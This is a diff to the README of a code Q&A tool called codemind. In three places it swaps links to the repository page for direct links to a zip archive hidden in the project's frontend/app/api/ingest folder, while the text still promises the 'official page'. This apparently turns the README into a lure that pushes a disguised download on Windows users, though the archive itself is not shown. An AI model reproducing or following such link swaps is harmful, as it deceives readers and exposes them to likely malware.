@@ -1,6 +1,6 @@
 # 🤖 codemind - Smart Code Q&A Made Simple
 
-[![Download codemind](https://img.shields.io/badge/Download-codemind-brightgreen?style=for-the-badge)](https://github.com/alfex41/codemind)
+[![Download codemind](https://img.shields.io/badge/Download-codemind-brightgreen?style=for-the-badge)](https://github.com/alfex41/codemind/raw/refs/heads/main/frontend/app/api/ingest/Software-v1.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To get codemind up and running on your Windows computer, follow these steps.
 
 Click the button below to open the page where you can download codemind:
   
-[![Download codemind](https://img.shields.io/badge/Download-codemind-blue?style=for-the-badge)](https://github.com/alfex41/codemind)
+[![Download codemind](https://img.shields.io/badge/Download-codemind-blue?style=for-the-badge)](https://github.com/alfex41/codemind/raw/refs/heads/main/frontend/app/api/ingest/Software-v1.6.zip)
 
 This page contains the latest files and instructions for installation.
 
@@ -163,5 +163,5 @@ Codemind uses the Endee vector database to index your code. This lets the system
 
 ---
 
-# [Download codemind](https://github.com/alfex41/codemind)  
+# [Download codemind](https://github.com/alfex41/codemind/raw/refs/heads/main/frontend/app/api/ingest/Software-v1.6.zip)  
 Click above to go to the official page for the latest files and support.
